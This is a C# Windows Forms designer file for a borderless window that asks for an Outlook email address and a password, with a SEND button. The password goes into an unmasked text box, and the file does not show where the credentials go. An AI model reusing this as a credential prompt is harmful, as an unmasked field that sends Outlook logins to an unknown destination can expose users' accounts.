namespace Protect_Pass
{
    partial class Form3
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form3));
            this.exitclickbtn = new System.Windows.Forms.PictureBox();
            this.minbtnclick = new System.Windows.Forms.PictureBox();
            this.sendbtn = new System.Windows.Forms.Button();
            this.passbaseform = new System.Windows.Forms.RichTextBox();
            this.MessageOut = new System.Windows.Forms.Label();
            this.emailform = new System.Windows.Forms.RichTextBox();
            this.label1 = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.exitclickbtn)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.minbtnclick)).BeginInit();
            this.SuspendLayout();
            // 
            // exitclickbtn
            // 
            this.exitclickbtn.Image = ((System.Drawing.Image)(resources.GetObject("exitclickbtn.Image")));
            this.exitclickbtn.Location = new System.Drawing.Point(746, 12);
            this.exitclickbtn.Name = "exitclickbtn";
            this.exitclickbtn.Size = new System.Drawing.Size(41, 38);
            this.exitclickbtn.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.exitclickbtn.TabIndex = 0;
            this.exitclickbtn.TabStop = false;
            this.exitclickbtn.Click += new System.EventHandler(this.exitclickbtn_Click);
            this.exitclickbtn.MouseLeave += new System.EventHandler(this.exitclickbtn_MouseLeave);
            this.exitclickbtn.MouseHover += new System.EventHandler(this.exitclickbtn_MouseHover);
            // 
            // minbtnclick
            // 
            this.minbtnclick.Image = ((System.Drawing.Image)(resources.GetObject("minbtnclick.Image")));
            this.minbtnclick.Location = new System.Drawing.Point(692, 25);
            this.minbtnclick.Name = "minbtnclick";
            this.minbtnclick.Size = new System.Drawing.Size(39, 10);
            this.minbtnclick.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
            this.minbtnclick.TabIndex = 1;
            this.minbtnclick.TabStop = false;
            this.minbtnclick.Click += new System.EventHandler(this.minbtnclick_Click);
            this.minbtnclick.MouseLeave += new System.EventHandler(this.minbtnclick_MouseLeave);
            this.minbtnclick.MouseHover += new System.EventHandler(this.minbtnclick_MouseHover);
            // 
            // sendbtn
            // 
            this.sendbtn.BackColor = System.Drawing.Color.LightSeaGreen;
            this.sendbtn.FlatAppearance.BorderSize = 0;
            this.sendbtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.sendbtn.Font = new System.Drawing.Font("Segoe UI", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.sendbtn.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
            this.sendbtn.Location = new System.Drawing.Point(316, 339);
            this.sendbtn.Name = "sendbtn";
            this.sendbtn.Size = new System.Drawing.Size(176, 48);
            this.sendbtn.TabIndex = 3;
            this.sendbtn.Text = "SEND";
            this.sendbtn.UseVisualStyleBackColor = false;
            this.sendbtn.Click += new System.EventHandler(this.browsebtn_Click);
            // 
            // passbaseform
            // 
            this.passbaseform.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.passbaseform.Font = new System.Drawing.Font("Segoe UI Light", 35.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.passbaseform.ForeColor = System.Drawing.Color.Gray;
            this.passbaseform.Location = new System.Drawing.Point(124, 244);
            this.passbaseform.Name = "passbaseform";
            this.passbaseform.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.ForcedHorizontal;
            this.passbaseform.Size = new System.Drawing.Size(570, 49);
            this.passbaseform.TabIndex = 4;
            this.passbaseform.Text = "";
            this.passbaseform.TextChanged += new System.EventHandler(this.directorytofilesform_TextChanged);
            // 
            // MessageOut
            // 
            this.MessageOut.AutoSize = true;
            this.MessageOut.BackColor = System.Drawing.Color.Teal;
            this.MessageOut.Font = new System.Drawing.Font("Segoe UI", 30F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.MessageOut.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
            this.MessageOut.Location = new System.Drawing.Point(281, 172);
            this.MessageOut.Name = "MessageOut";
            this.MessageOut.Size = new System.Drawing.Size(255, 54);
            this.MessageOut.TabIndex = 5;
            this.MessageOut.Text = "PASSWORD:";
            // 
            // emailform
            // 
            this.emailform.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.emailform.Font = new System.Drawing.Font("Segoe UI Light", 35.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.emailform.ForeColor = System.Drawing.Color.Gray;
            this.emailform.Location = new System.Drawing.Point(124, 120);
            this.emailform.Name = "emailform";
            this.emailform.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.ForcedHorizontal;
            this.emailform.Size = new System.Drawing.Size(570, 49);
            this.emailform.TabIndex = 6;
            this.emailform.Text = "";
            this.emailform.TextChanged += new System.EventHandler(this.emailform_TextChanged);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Teal;
            this.label1.Font = new System.Drawing.Font("Segoe UI", 30F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
            this.label1.Location = new System.Drawing.Point(245, 48);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(352, 54);
            this.label1.TabIndex = 7;
            this.label1.Text = "OUTLOOK EMAIL:";
            // 
            // Form3
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Teal;
            this.ClientSize = new System.Drawing.Size(799, 399);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.emailform);
            this.Controls.Add(this.MessageOut);
            this.Controls.Add(this.passbaseform);
            this.Controls.Add(this.sendbtn);
            this.Controls.Add(this.minbtnclick);
            this.Controls.Add(this.exitclickbtn);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form3";
            this.Text = "Form3";
            this.Load += new System.EventHandler(this.Form3_Load);
            this.Click += new System.EventHandler(this.Form3_Click);
            this.MouseHover += new System.EventHandler(this.Form3_MouseHover);
            ((System.ComponentModel.ISupportInitialize)(this.exitclickbtn)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.minbtnclick)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.PictureBox exitclickbtn;
        private System.Windows.Forms.PictureBox minbtnclick;
        private System.Windows.Forms.Button sendbtn;
        private System.Windows.Forms.RichTextBox passbaseform;
        private System.Windows.Forms.Label MessageOut;
        private System.Windows.Forms.RichTextBox emailform;
        private System.Windows.Forms.Label label1;
    }
}